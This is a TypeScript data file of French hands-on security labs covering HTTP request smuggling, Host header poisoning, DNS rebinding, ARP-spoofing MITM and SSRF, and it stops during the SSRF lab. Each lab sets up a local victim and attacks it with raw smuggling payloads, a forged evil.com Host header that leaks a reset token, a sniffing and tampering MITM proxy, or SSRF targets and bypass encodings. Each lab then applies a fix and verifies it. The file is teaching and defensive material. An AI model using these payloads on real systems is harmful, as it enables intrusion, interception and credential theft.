// Code Noir — Labs A→Z du module 1 (Réseau & protocoles).
//
// Chaque technique = un lab guidé exécutable dans le CONTENEUR LAB Docker
// (target "docker-bash") : bash, curl, dig, openssl, nmap, ncat/netcat,
// tcpdump, python3 — AUCUN réseau externe (--network none). Tout cible donc
// 127.0.0.1 / localhost : on monte la "victime" en arrière-plan dans une
// étape, puis on l'attaque en local. Les étapes purement conceptuelles
// (théorie, techniques qui exigent un vrai DNS/LAN) utilisent target "read".
//
// Cadre légal : ces techniques ne s'exercent QUE sur des labs isolés et des
// cibles explicitement autorisées. Ici tout reste dans le conteneur éphémère.

import type { CodeNoirStepsByTechnique } from "./types";

export const stepsM01: CodeNoirStepsByTechnique = {
  // ============================================================
  // HTTP Request Smuggling (CL.TE / TE.CL)
  // ============================================================
  "http-smuggling": [
    {
      n: 1,
      title: "Le désaccord CL vs TE",
      goal: "Comprendre pourquoi deux serveurs en chaîne peuvent découper différemment une même requête.",
      explain:
        "Une requête HTTP/1.1 peut indiquer sa longueur de **deux** façons :\n\n- **Content-Length (CL)** : un nombre d'octets fixe.\n- **Transfer-Encoding: chunked (TE)** : une suite de blocs, terminée par un chunk de taille `0`.\n\nLa RFC interdit d'utiliser les deux à la fois. Mais si un **proxy front** et un **backend** ne tranchent pas le conflit de la même manière, ils ne sont plus d'accord sur **où finit la requête**. L'octet de désaccord devient le **début d'une requête fantôme** que le backend va préfixer devant la prochaine victime.\n\n- **CL.TE** : le front respecte `Content-Length`, le back respecte `Transfer-Encoding`.\n- **TE.CL** : l'inverse.\n\nCette étape est conceptuelle : un vrai smuggling exige une vraie chaîne front+back désynchronisée (labs PortSwigger). On va ensuite reproduire localement le **mécanisme** : un parseur naïf qui se trompe de frontière.",
      target: "read",
    },
    {
      n: 2,
      title: "Anatomie d'un payload CL.TE",
      goal: "Lire octet par octet un payload de smuggling et identifier la partie « contrebande ».",
      explain:
        "Le payload CL.TE classique :\n\n```http\nPOST / HTTP/1.1\\r\\n\nHost: localhost\\r\\n\nContent-Length: 6\\r\\n\nTransfer-Encoding: chunked\\r\\n\n\\r\\n\n0\\r\\n\n\\r\\n\nGET /admin HTTP/1.1\\r\\n ...  <- contrebande\n```\n\n- Le **front (CL=6)** lit `0\\r\\n\\r\\n` (6 octets) et s'arrête : pour lui la requête est complète.\n- Le **back (TE)** lit le chunk `0` = fin de corps, puis considère `GET /admin ...` comme une **nouvelle requête** sur la connexion réutilisée.\n\nLe `\\r\\n` est crucial (CRLF). En bash on l'écrit avec `printf` et `\\r\\n`. Cette étape est de la lecture : repère bien que la frontière dépend de QUI compte les octets.",
      target: "read",
    },
    {
      n: 3,
      title: "Monter un backend qui se trompe de frontière",
      goal: "Lancer en local un mini-serveur HTTP qui illustre le découpage chunked naïf.",
      explain:
        "On démarre un petit serveur Python qui rejoue le rôle du **backend faible** : il lit une requête, et si elle contient `Transfer-Encoding: chunked`, il interprète le corps comme du chunked et **garde le reste du flux** comme requête suivante. C'est exactement le comportement qui rend le smuggling possible.\n\n**Cadre légal : ce serveur tourne sur 127.0.0.1 dans ton conteneur isolé. Ne reproduis JAMAIS ce test sur une infra que tu ne possèdes pas — le smuggling se pratique sur les labs PortSwigger ou un scope de bug bounty écrit.**",
      target: "docker-bash",
      code: `cat > /tmp/desync.py <<'PY'
import socketserver

class H(socketserver.StreamRequestHandler):
    def handle(self):
        raw = self.connection.recv(65535).decode("latin1")
        head, _, body = raw.partition("\\r\\n\\r\\n")
        chunked = "transfer-encoding: chunked" in head.lower()
        # backend naif : si chunked, fin de corps = chunk "0", le reste = requete suivante
        if chunked and "0\\r\\n\\r\\n" in body:
            consumed, _, smuggled = body.partition("0\\r\\n\\r\\n")
            print("[backend] requete 1 consommee, corps chunked:", repr(consumed))
            print("[backend] >>> REQUETE FANTOME detectee:", repr(smuggled[:80]))
        else:
            print("[backend] requete normale, corps:", repr(body[:80]))
        self.wfile.write(b"HTTP/1.1 200 OK\\r\\nContent-Length: 2\\r\\n\\r\\nok")

with socketserver.TCPServer(("127.0.0.1", 8088), H) as s:
    s.handle_request()  # on traite une seule connexion puis on quitte
PY
python3 /tmp/desync.py &
sleep 1
echo "backend desync lance sur 127.0.0.1:8088"`,
      expected:
        "Le serveur démarre en arrière-plan : « backend desync lance sur 127.0.0.1:8088 ». Il attend une connexion.",
    },
    {
      n: 4,
      title: "Envoyer le payload de contrebande",
      goal: "Émettre un POST CL.TE brut avec netcat et observer la requête fantôme côté backend.",
      explain:
        "On fabrique le payload brut avec `printf` (CRLF explicites) et on l'envoie au backend via `ncat`. On y glisse une requête fantôme `GET /admin`. Le serveur de l'étape 3 va imprimer qu'il a détecté une **requête fantôme** — c'est le cœur du smuggling : l'attaquant a injecté une 2e requête dans la connexion.\n\n**Cadre légal : envoi de requêtes brutes forgées = uniquement contre ta propre cible de lab (ici 127.0.0.1).**",
      target: "docker-bash",
      code: `printf 'POST / HTTP/1.1\\r\\nHost: localhost\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\n' | ncat 127.0.0.1 8088
echo
echo "--- regarde la sortie du backend (etape 3) ---"`,
      expected:
        "Le backend imprime « >>> REQUETE FANTOME detectee: 'GET /admin HTTP/1.1...' ». La désynchronisation a injecté une requête masquée.",
    },
    {
      n: 5,
      title: "Détecter une cible via timing",
      goal: "Comprendre la sonde time-based qui révèle une chaîne vulnérable sans exploit complet.",
      explain:
        "En vrai, on ne voit pas les logs du backend. La détection se fait au **timing** : on envoie un payload où le backend va **attendre** des octets qui ne viendront jamais (un chunk annoncé plus gros que ce qu'on envoie). Si la connexion **traîne** (timeout) alors qu'une requête normale répond vite, la chaîne est probablement désynchronisée. C'est la sonde de `smuggler.py`.\n\nCeci est conceptuel ici (pas de vraie chaîne front+back), mais la commande montre comment mesurer un temps de réponse en local avec `curl -w`.",
      target: "docker-bash",
      code: `python3 -m http.server 8099 >/dev/null 2>&1 &
sleep 1
echo "Temps de reponse d'une requete normale :"
curl -s -o /dev/null -w 'temps=%{time_total}s code=%{http_code}\\n' http://127.0.0.1:8099/
kill %1 2>/dev/null`,
      expected:
        "Un temps de réponse très court (ex. temps=0.00x). En conditions réelles, un payload de smuggling ferait grimper ce temps vers le timeout → signal de vulnérabilité.",
    },
    {
      n: 6,
      title: "Corriger : rejeter le double header",
      goal: "Écrire un front qui refuse toute requête portant à la fois CL et TE.",
      explain:
        "La défense canonique : **le front rejette les requêtes ambiguës**. Si `Content-Length` ET `Transfer-Encoding` sont présents, on renvoie `400` et on ferme la connexion (`Connection: close`). On peut aussi normaliser : un seul des deux survit. On code ici un mini-front strict.\n\nAutres mesures : `Connection: close` après chaque requête, et surtout **HTTP/2 de bout en bout** (le framing y est non ambigu, ce qui élimine cette classe).",
      target: "docker-bash",
      code: `cat > /tmp/front_safe.py <<'PY'
import socketserver

class H(socketserver.StreamRequestHandler):
    def handle(self):
        raw = self.connection.recv(65535).decode("latin1")
        head = raw.split("\\r\\n\\r\\n", 1)[0].lower()
        has_cl = "content-length:" in head
        has_te = "transfer-encoding:" in head
        if has_cl and has_te:
            print("[front] REJET : CL + TE simultanes -> 400")
            self.wfile.write(b"HTTP/1.1 400 Bad Request\\r\\nConnection: close\\r\\n\\r\\n")
        else:
            print("[front] requete non ambigue -> 200")
            self.wfile.write(b"HTTP/1.1 200 OK\\r\\nConnection: close\\r\\nContent-Length: 2\\r\\n\\r\\nok")

with socketserver.TCPServer(("127.0.0.1", 8089), H) as s:
    s.handle_request()
PY
python3 /tmp/front_safe.py &
sleep 1
echo "front strict lance sur 127.0.0.1:8089"`,
      expected: "« front strict lance sur 127.0.0.1:8089 ». Le front durci attend une connexion.",
    },
    {
      n: 7,
      title: "Vérifier le correctif",
      goal: "Rejouer le payload CL.TE contre le front durci et confirmer le rejet 400.",
      explain:
        "On renvoie exactement le même payload qu'à l'étape 4, mais cette fois vers le front strict. Il doit répondre **400 Bad Request** et le log doit afficher « REJET : CL + TE simultanés ». La requête fantôme n'est jamais transmise : le smuggling est neutralisé à la frontière.",
      target: "docker-bash",
      code: `printf 'POST / HTTP/1.1\\r\\nHost: localhost\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\n\\r\\n' | ncat 127.0.0.1 8089
echo
echo "--- le front (etape 6) doit afficher REJET ---"`,
      expected:
        "Réponse « HTTP/1.1 400 Bad Request » et log « [front] REJET : CL + TE simultanes -> 400 ». La requête ambiguë est bloquée avant tout traitement.",
    },
  ],

  // ============================================================
  // Host Header Poisoning
  // ============================================================
  "host-header-injection": [
    {
      n: 1,
      title: "Pourquoi le Host est dangereux",
      goal: "Comprendre que le header Host est un input client, pas une vérité serveur.",
      explain:
        "Le header `Host` est entièrement **contrôlé par le client**. Quand une app construit une URL absolue avec `req.headers.host` — par exemple un lien de réinitialisation de mot de passe — l'attaquant peut y mettre `evil.com`. La victime reçoit alors un mail pointant vers le domaine de l'attaquant, **avec son token valide** : c'est le **password reset poisoning**.\n\nAutres impacts : **cache poisoning** (un Host falsifié pollue une entrée de cache servie aux suivants) et **bypass d'auth** (`Host: localhost` qui déclenche un mode admin interne). La racine commune : faire confiance à un en-tête manipulable.",
      target: "read",
    },
    {
      n: 2,
      title: "Monter l'app vulnérable",
      goal: "Lancer en local un endpoint /reset qui génère le lien à partir du header Host.",
      explain:
        "On démarre un mini-serveur Python qui implémente la faute classique : il fabrique le lien de reset à partir de `Host`. C'est notre cobaye sur 127.0.0.1.\n\n**Cadre légal : cobaye local dans ton conteneur isolé. Tester du host header poisoning sur une vraie cible exige une autorisation écrite (bug bounty / pentest).**",
      target: "docker-bash",
      code: `cat > /tmp/reset_vuln.py <<'PY'
from http.server import BaseHTTPRequestHandler, HTTPServer

class H(BaseHTTPRequestHandler):
    def do_POST(self):
        host = self.headers.get("Host", "?")
        token = "SECRET-TOKEN-123"
        link = "https://" + host + "/reset?token=" + token  # BUG: Host non valide
        print("[app] mail envoye avec lien:", link)
        self.send_response(200); self.end_headers()
        self.wfile.write(b"reset mail sent")
    def log_message(self, *a): pass

HTTPServer(("127.0.0.1", 8090), H).serve_forever()
PY
python3 /tmp/reset_vuln.py &
sleep 1
echo "app reset vulnerable sur 127.0.0.1:8090"`,
      expected: "« app reset vulnerable sur 127.0.0.1:8090 ». Le serveur tourne en arrière-plan.",
    },
    {
      n: 3,
      title: "Empoisonner le lien de reset",
      goal: "Envoyer une requête avec un Host falsifié et voir le lien pointer vers evil.com.",
      explain:
        "On envoie un POST `/reset` en forçant `Host: evil.com` (avec `curl -H` ou `--resolve`). Le serveur va imprimer un lien `https://evil.com/reset?token=...`. Dans la vraie vie, ce lien part par mail à la victime : si elle clique, le token fuit vers l'attaquant.\n\n**Cadre légal : injection d'en-tête contre TA cible de lab uniquement (127.0.0.1).**",
      target: "docker-bash",
      code: `curl -s -X POST http://127.0.0.1:8090/reset -H 'Host: evil.com' -d 'email=victim@target.com'
echo
echo "--- regarde le log de l'app (etape 2) : le lien pointe vers evil.com ---"`,
      expected:
        "L'app imprime « [app] mail envoye avec lien: https://evil.com/reset?token=SECRET-TOKEN-123 ». Le token part vers le domaine attaquant.",
    },
    {
      n: 4,
      title: "Variante : bypass via Host: localhost",
      goal: "Tester si un Host interne déclenche un comportement privilégié.",
      explain:
        "Certaines apps activent un mode admin quand `Host` vaut `localhost`/`127.0.0.1` (supposé « interne »). On sonde ça simplement : envoyer plusieurs valeurs de Host et comparer les réponses. Ici on rejoue notre app pour montrer la mécanique de la sonde (la valeur du Host est librement choisie côté client).",
      target: "docker-bash",
      code: `for h in evil.com localhost 127.0.0.1 internal-admin; do
  echo "== Host: $h =="
  curl -s -X POST http://127.0.0.1:8090/reset -H "Host: $h" -d 'email=x' >/dev/null
done
echo "--- compare les liens imprimes par l'app : chaque Host est accepte tel quel ---"`,
      expected:
        "L'app accepte chaque valeur de Host et l'injecte dans le lien (evil.com, localhost, internal-admin...). Aucune validation = surface d'attaque.",
    },
    {
      n: 5,
      title: "Corriger : URL de base fixe",
      goal: "Réécrire l'app pour construire les liens depuis une variable d'env, jamais depuis Host.",
      explain:
        "La défense : **ne jamais dériver une URL externe du Host client**. On utilise une `PUBLIC_URL` figée (variable d'env / config). En complément, le reverse proxy applique une **allowlist** de hostnames acceptés. On code ici la version durcie : le lien est construit avec `PUBLIC_URL`, le Host entrant est ignoré (et on peut même rejeter un Host hors allowlist).",
      target: "docker-bash",
      code: `cat > /tmp/reset_safe.py <<'PY'
import os
from http.server import BaseHTTPRequestHandler, HTTPServer

PUBLIC_URL = os.environ.get("PUBLIC_URL", "https://app.porterfield.online")
ALLOWED = {"app.porterfield.online", "127.0.0.1:8091"}

class H(BaseHTTPRequestHandler):
    def do_POST(self):
        host = self.headers.get("Host", "")
        if host not in ALLOWED:
            print("[app] Host non autorise rejete:", host)
            self.send_response(400); self.end_headers(); self.wfile.write(b"bad host"); return
        link = PUBLIC_URL + "/reset?token=SECRET-TOKEN-123"  # FIX: base fixe
        print("[app] lien sur (base fixe):", link)
        self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
    def log_message(self, *a): pass

HTTPServer(("127.0.0.1", 8091), H).serve_forever()
PY
PUBLIC_URL="https://app.porterfield.online" python3 /tmp/reset_safe.py &
sleep 1
echo "app reset durcie sur 127.0.0.1:8091"`,
      expected: "« app reset durcie sur 127.0.0.1:8091 ». Le serveur corrigé tourne.",
    },
    {
      n: 6,
      title: "Vérifier : Host falsifié neutralisé",
      goal: "Rejouer l'attaque contre l'app durcie et confirmer que le lien reste sur le bon domaine.",
      explain:
        "On renvoie un `Host: evil.com` à l'app durcie. Deux résultats possibles selon l'allowlist : soit la requête est **rejetée (400)** car le Host n'est pas autorisé, soit (si on passe un Host autorisé) le lien reste sur `PUBLIC_URL`. Dans tous les cas, `evil.com` ne se retrouve **jamais** dans le lien.",
      target: "docker-bash",
      code: `echo "== attaque Host: evil.com =="
curl -s -X POST http://127.0.0.1:8091/reset -H 'Host: evil.com' -d 'email=x'; echo
echo "== requete legitime Host autorise =="
curl -s -X POST http://127.0.0.1:8091/reset -H 'Host: 127.0.0.1:8091' -d 'email=x'; echo
echo "--- le lib imprime reste sur app.porterfield.online, jamais evil.com ---"`,
      expected:
        "Host: evil.com → « bad host » (400) et log « Host non autorise rejete ». Host autorisé → lien « https://app.porterfield.online/reset?... ». L'empoisonnement est impossible.",
    },
  ],

  // ============================================================
  // DNS Rebinding
  // ============================================================
  "dns-rebinding": [
    {
      n: 1,
      title: "La faille de la Same-Origin Policy",
      goal: "Comprendre que l'origin du navigateur se base sur le hostname, pas sur l'IP réelle.",
      explain:
        "La **Same-Origin Policy** isole les sites par origin (scheme + host + port). Mais le host est un **nom**, pas une IP. Si `evil.com` résout d'abord vers l'IP de l'attaquant, puis (TTL très court) vers `192.168.1.1` (le routeur de la victime), le navigateur considère que c'est **toujours la même origin** `evil.com` — et laisse le JS de l'attaquant parler au routeur **avec les credentials de la victime**.\n\nDéroulé :\n1. Victime visite `evil.com` (→ IP attaquant), le JS s'exécute.\n2. TTL DNS = 3s.\n3. L'attaquant rebascule `evil.com` → `192.168.1.1`.\n4. Le JS refait un `fetch('http://evil.com/')` → frappe maintenant le routeur local.\n\nUsage : atteindre des services internes (admin routeur, RPC localhost, metadata cloud).",
      target: "read",
    },
    {
      n: 2,
      title: "Pourquoi un vrai rebinding exige un vrai DNS",
      goal: "Cerner la limite du lab : pas de réseau externe, donc pas de bascule DNS réelle.",
      explain:
        "Le rebinding réel suppose un **serveur DNS autoritaire** que l'attaquant pilote (rbndr.us, Singularity of Origin) et un navigateur victime. Dans ce conteneur `--network none`, il n'y a ni DNS externe ni navigateur. On va donc :\n\n- **Simuler** la bascule de résolution en local via `/etc/hosts` + `dig`.\n- **Reproduire** la partie réellement faisable : un service interne sans auth (le « routeur ») accessible une fois qu'on « résout » vers lui.\n\nC'est l'approche read+pratique : la théorie de la bascule en lecture, le service interne vulnérable en exécution.",
      target: "read",
    },
    {
      n: 3,
      title: "Monter le service interne « routeur »",
      goal: "Lancer un service local sans authentification, comme un panneau d'admin de routeur.",
      explain:
        "On démarre un faux panneau d'admin sur 127.0.0.1 qui expose `/admin` **sans authentification** (il fait confiance au fait d'être « interne »). C'est exactement la cible d'un rebinding : un service qui ne s'attend pas à recevoir des requêtes pilotées par un site web externe.\n\n**Cadre légal : ce service interne tourne dans ton conteneur isolé. Le rebinding contre un vrai routeur ne se teste que sur TON propre réseau / un lab.**",
      target: "docker-bash",
      code: `cat > /tmp/router.py <<'PY'
from http.server import BaseHTTPRequestHandler, HTTPServer

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        # routeur naif : aucune auth, fait confiance au "reseau interne"
        self.send_response(200); self.end_headers()
        self.wfile.write(b"ADMIN ROUTEUR — wifi_password=hunter2 — firmware=1.0")
    def log_message(self, *a): pass

HTTPServer(("127.0.0.1", 8092), H).serve_forever()
PY
python3 /tmp/router.py &
sleep 1
echo "routeur interne (sans auth) sur 127.0.0.1:8092"`,
      expected: "« routeur interne (sans auth) sur 127.0.0.1:8092 ». Le service tourne.",
    },
    {
      n: 4,
      title: "Simuler la bascule DNS",
      goal: "Mimer le passage d'un hostname de l'IP attaquant vers l'IP interne via /etc/hosts.",
      explain:
        "On simule le rebinding en pointant un hostname `evil.lab` d'abord ailleurs, puis vers `127.0.0.1` (notre « routeur »). On édite `/etc/hosts` (équivalent local d'une résolution DNS) puis on vérifie avec `dig`/`getent`. C'est la transposition locale de l'étape « TTL court → rebascule ».",
      target: "docker-bash",
      code: `echo "127.0.0.1 evil.lab" >> /etc/hosts 2>/dev/null || sudo sh -c 'echo "127.0.0.1 evil.lab" >> /etc/hosts'
echo "Resolution apres bascule :"
getent hosts evil.lab || python3 -c "import socket; print('evil.lab ->', socket.gethostbyname('evil.lab'))"`,
      expected:
        "« evil.lab -> 127.0.0.1 » : le hostname résout désormais vers le service interne, comme après une bascule DNS rebinding.",
    },
    {
      n: 5,
      title: "Frapper le service interne « comme un navigateur »",
      goal: "Exploiter la résolution rebascule pour lire les secrets du routeur.",
      explain:
        "Maintenant que `evil.lab` pointe vers le routeur, un `fetch` (ici `curl`) vers `http://evil.lab:8092/admin` atteint le service interne — exactement ce que ferait le JS de l'attaquant après rebinding. On exfiltre la config du routeur (mot de passe wifi). C'est la **preuve pédagogique** de l'impact : un site externe a lu un service censé être inaccessible.\n\n**Cadre légal : exploitation contre TA cible de lab uniquement.**",
      target: "docker-bash",
      code: `echo "Requete 'cross-origin' vers le hostname rebascule :"
curl -s http://evil.lab:8092/admin
echo
echo "--- secrets internes lus depuis un hostname externe = impact du rebinding ---"`,
      expected:
        "« ADMIN ROUTEUR — wifi_password=hunter2 — firmware=1.0 ». Le service interne a été lu via le hostname externe : rebinding réussi (en simulation).",
    },
    {
      n: 6,
      title: "Corriger : header secret + validation Host",
      goal: "Durcir le service interne pour qu'il rejette les requêtes pilotées par un navigateur externe.",
      explain:
        "Défenses :\n1. **Header secret interne** (`X-Internal-Auth`) qu'un navigateur **ne peut pas** ajouter en cross-origin sans CORS → le rebinding échoue.\n2. **Validation du Host** : n'accepter que les Host attendus (`127.0.0.1`, le nom interne légitime), rejeter `evil.lab`.\n3. CORS strict, et pour un vrai routeur : changer le mot de passe par défaut, couper UPnP.\n\nOn code la version durcie qui exige le header et valide le Host.",
      target: "docker-bash",
      code: `cat > /tmp/router_safe.py <<'PY'
from http.server import BaseHTTPRequestHandler, HTTPServer

ALLOWED_HOSTS = {"127.0.0.1:8093", "localhost:8093"}
SECRET = "internal-only-9f3a"

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        host = self.headers.get("Host", "")
        auth = self.headers.get("X-Internal-Auth", "")
        if host not in ALLOWED_HOSTS:
            print("[router] Host rejete:", host); self.send_response(403); self.end_headers(); self.wfile.write(b"forbidden host"); return
        if auth != SECRET:
            print("[router] header secret manquant"); self.send_response(401); self.end_headers(); self.wfile.write(b"need X-Internal-Auth"); return
        self.send_response(200); self.end_headers(); self.wfile.write(b"ADMIN OK")
    def log_message(self, *a): pass

HTTPServer(("127.0.0.1", 8093), H).serve_forever()
PY
python3 /tmp/router_safe.py &
sleep 1
echo "routeur durci sur 127.0.0.1:8093"`,
      expected: "« routeur durci sur 127.0.0.1:8093 ». Le service exige header secret + Host valide.",
    },
    {
      n: 7,
      title: "Vérifier : rebinding bloqué",
      goal: "Rejouer l'attaque et un accès légitime contre le service durci.",
      explain:
        "On teste trois cas contre le service durci :\n1. Requête type rebinding via `evil.lab` (Host falsifié, pas de secret) → **rejetée**.\n2. Bon Host mais sans header secret → **401**.\n3. Accès interne légitime (bon Host + header secret) → **200**.\n\nLe service interne n'est plus joignable par un navigateur externe : la classe rebinding est neutralisée.",
      target: "docker-bash",
      code: `echo "1) attaque rebinding (Host evil.lab, sans secret) :"
curl -s -H 'Host: evil.lab:8093' http://127.0.0.1:8093/admin; echo
echo "2) bon Host mais sans secret :"
curl -s http://127.0.0.1:8093/admin; echo
echo "3) acces interne legitime :"
curl -s -H 'X-Internal-Auth: internal-only-9f3a' http://127.0.0.1:8093/admin; echo`,
      expected:
        "1) « forbidden host » (403). 2) « need X-Internal-Auth » (401). 3) « ADMIN OK ». Seul l'accès interne authentifié passe.",
    },
  ],

  // ============================================================
  // ARP Spoofing → MITM sur LAN
  // ============================================================
  "arp-spoofing-mitm": [
    {
      n: 1,
      title: "ARP sans authentification",
      goal: "Comprendre pourquoi le protocole ARP permet trivialement le MITM sur un LAN.",
      explain:
        "Sur un LAN, pour parler à une IP il faut sa **MAC**. ARP demande « qui a 192.168.1.1 ? » en broadcast, et **le premier à répondre « c'est moi » gagne** — il n'y a **aucune authentification**. Un attaquant sur le même segment L2 envoie des réponses ARP forgées (*gratuitous ARP*) pour associer l'IP de la gateway à **sa propre MAC** (et l'IP de la victime à sa MAC côté gateway). Résultat : tout le trafic transite par lui → il peut **sniffer, altérer, injecter** (MITM).\n\nPour ne pas couper la victime, l'attaquant active `ip_forward` et relaie le trafic. Outils réels : `arpspoof` (dsniff), ettercap, bettercap, Wireshark.",
      target: "read",
    },
    {
      n: 2,
      title: "Pourquoi pas de vrai LAN ici",
      goal: "Cerner la limite : un seul host, pas de second poste ni de gateway à empoisonner.",
      explain:
        "Empoisonner un cache ARP exige **plusieurs machines** sur un même segment L2 (victime, gateway, attaquant) et la capacité d'émettre des trames ARP brutes sur une interface. Le conteneur `--network none` n'a qu'une **loopback** et aucun voisin → pas de cache ARP à empoisonner.\n\nOn fait donc : la théorie ARP en lecture, puis on **inspecte la table ARP locale** et on **reproduit le rôle « man-in-the-middle » en TCP** via un relais sur loopback (un proxy qui s'intercale entre un client et un serveur, ce qui est le cœur de l'impact MITM : voir et modifier le trafic).",
      target: "read",
    },
    {
      n: 3,
      title: "Observer le cache ARP local",
      goal: "Lire la table ARP et la notion IP→MAC qui est précisément ce que l'attaque corrompt.",
      explain:
        "On inspecte ce qu'ARP gère : la correspondance **IP → MAC**. Selon l'outillage du conteneur, `ip neigh` ou `arp -a` liste ce cache. Sur loopback il sera quasi vide, mais l'objectif est de **voir la structure** que l'attaquant falsifie : remplacer la MAC associée à une IP par la sienne.",
      target: "docker-bash",
      code: `echo "== table de voisinage (ip neigh) =="
ip neigh show 2>/dev/null || arp -a 2>/dev/null || echo "(cache vide sur loopback)"
echo
echo "== interfaces disponibles =="
ip -br link 2>/dev/null || cat /proc/net/dev`,
      expected:
        "Le cache ARP/voisinage (souvent vide sur loopback) et la liste des interfaces (au moins `lo`). C'est la donnée IP→MAC qu'une attaque ARP corromprait.",
    },
    {
      n: 4,
      title: "Monter la victime et le serveur",
      goal: "Lancer un serveur « légitime » et un client qui s'y connecte, sur loopback.",
      explain:
        "On simule la communication victime↔serveur que l'attaquant veut intercepter. Le serveur écoute sur un port et renvoie une donnée sensible (« mot de passe en clair »). On vérifie d'abord la communication **directe et saine** (pas encore de MITM).\n\n**Cadre légal : tout reste sur 127.0.0.1. Un vrai MITM intercepte des communications privées → strictement réservé à ton LAN / lab / mandat écrit.**",
      target: "docker-bash",
      code: `cat > /tmp/server.py <<'PY'
import socketserver
class H(socketserver.StreamRequestHandler):
    def handle(self):
        data = self.rfile.readline().strip()
        print("[serveur] recu:", data)
        self.wfile.write(b"SECRET: login=admin pass=hunter2\\n")
class S(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
S(("127.0.0.1", 9001), H).serve_forever()
PY
python3 /tmp/server.py &
sleep 1
echo "== connexion DIRECTE (saine) victime -> serveur =="
printf 'GET /secret\\n' | ncat 127.0.0.1 9001`,
      expected:
        "Le serveur tourne et la connexion directe renvoie « SECRET: login=admin pass=hunter2 ». C'est le trafic en clair qu'un MITM convoiterait.",
    },
    {
      n: 5,
      title: "S'intercaler : le relais MITM",
      goal: "Lancer un proxy qui s'intercale, sniffe et altère le trafic — l'effet d'un ARP spoof réussi.",
      explain:
        "Une fois l'attaquant « au milieu » (ce que l'ARP spoof procure sur un vrai LAN), il **relaie** le trafic entre victime et serveur tout en le lisant/modifiant. On reproduit ce rôle avec un petit proxy Python sur le port 9000 qui transfère vers le serveur 9001, **affiche** ce qui passe (sniff) et **réécrit** la réponse (injection). On pointe ensuite la victime vers le proxy.\n\n**Cadre légal : interception/altération de trafic = uniquement contre TES cibles de lab.**",
      target: "docker-bash",
      code: `cat > /tmp/mitm.py <<'PY'
import socket, socketserver
class H(socketserver.StreamRequestHandler):
    def handle(self):
        req = self.rfile.readline()
        print("[MITM] sniff requete:", req.strip())
        up = socket.create_connection(("127.0.0.1", 9001))
        up.sendall(req)
        resp = up.recv(4096)
        print("[MITM] sniff reponse serveur:", resp.strip())
        tampered = resp.replace(b"hunter2", b"PWNED-BY-MITM")  # injection
        self.wfile.write(tampered)
        up.close()
class S(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
S(("127.0.0.1", 9000), H).serve_forever()
PY
python3 /tmp/mitm.py &
sleep 1
echo "== la victime croit parler au serveur, mais passe par le MITM (9000) =="
printf 'GET /secret\\n' | ncat 127.0.0.1 9000`,
      expected:
        "Le MITM imprime la requête ET la réponse sniffées (le pass en clair), et la victime reçoit « SECRET: login=admin pass=PWNED-BY-MITM » : trafic lu ET altéré.",
    },
    {
      n: 6,
      title: "Corriger : chiffrement de bout en bout",
      goal: "Montrer qu'un canal TLS rend l'interception inutile même en position MITM.",
      explain:
        "La défense la plus robuste contre le MITM applicatif : **chiffrer de bout en bout**. Même intercalé, l'attaquant ne lit ni n'altère le contenu (il ne peut pas déchiffrer ni reforger sans le certificat). On génère un certificat auto-signé et on monte un serveur TLS local. (Côté LAN, on ajoute : ARP statique, Dynamic ARP Inspection, 802.1X, arpwatch.)",
      target: "docker-bash",
      code: `openssl req -x509 -newkey rsa:2048 -keyout /tmp/k.pem -out /tmp/c.pem -days 1 -nodes -subj "/CN=localhost" 2>/dev/null
cat > /tmp/tls_server.py <<'PY'
import http.server, ssl
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain("/tmp/c.pem", "/tmp/k.pem")
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.end_headers()
        self.wfile.write(b"SECRET chiffre de bout en bout")
    def log_message(self,*a): pass
httpd = http.server.HTTPServer(("127.0.0.1", 9443), H)
httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
httpd.serve_forever()
PY
python3 /tmp/tls_server.py &
sleep 1
echo "serveur TLS sur 127.0.0.1:9443"`,
      expected: "« serveur TLS sur 127.0.0.1:9443 ». Le canal est désormais chiffré.",
    },
    {
      n: 7,
      title: "Vérifier : le MITM ne lit plus rien",
      goal: "Tenter de sniffer le TLS et confirmer que le contenu est illisible/non altérable.",
      explain:
        "On se connecte légitimement en TLS (`curl -k`, contenu OK) puis on simule un sniff brut du flux avec `ncat` : on n'obtient que des octets chiffrés du handshake, **pas** le secret en clair. Sans la clé privée, le MITM ne peut ni lire ni reforger : l'interception devient stérile. (Sur un vrai LAN, on combine avec ARP statique/DAI pour empêcher l'interception elle-même.)",
      target: "docker-bash",
      code: `echo "== client legitime en TLS =="
curl -sk https://127.0.0.1:9443/ ; echo
echo
echo "== tentative de sniff brut du flux TLS (octets chiffres) =="
printf 'GET / HTTP/1.0\\r\\n\\r\\n' | ncat 127.0.0.1 9443 2>/dev/null | head -c 60 | xxd | head -3
echo "--- aucun secret en clair : le handshake TLS est illisible ---"`,
      expected:
        "Le client TLS lit « SECRET chiffre de bout en bout ». Le sniff brut ne montre que des octets binaires (handshake), aucun secret lisible : MITM neutralisé par le chiffrement.",
    },
  ],

  // ============================================================
  // SSRF — Server-Side Request Forgery
  // ============================================================
  ssrf: [
    {
      n: 1,
      title: "Le serveur fetch une URL que tu contrôles",
      goal: "Comprendre la primitive SSRF et ses cibles privilégiées.",
      explain:
        "SSRF = faire **fetcher au serveur** une URL fournie par l'utilisateur. Le serveur, lui, est **dans le réseau interne** : il atteint des choses que l'attaquant ne pourrait jamais joindre directement.\n\n```js\napp.post('/preview', async (req) => fetch(req.body.url)); // BUG: URL user-controlled\n```\n\nCibles classiques :\n- `http://169.254.169.254/latest/meta-data/...` → **clés IAM AWS** (IMDSv1).\n- `http://localhost:6379/` → Redis non authentifié.\n- `http://127.0.0.1:9200/_cluster/health` → Elasticsearch interne.\n- `file:///etc/passwd` → si `file://` accepté.\n\nBypass de filtres : IP décimale `http://2130706433/` (=127.0.0.1), hex `0x7f000001`, IPv6 mappé `[::ffff:127.0.0.1]`, DNS rebinding.",
      target: "read",
    },
    {
      n: 2,
      title: "Monter le service « interne » à protéger",
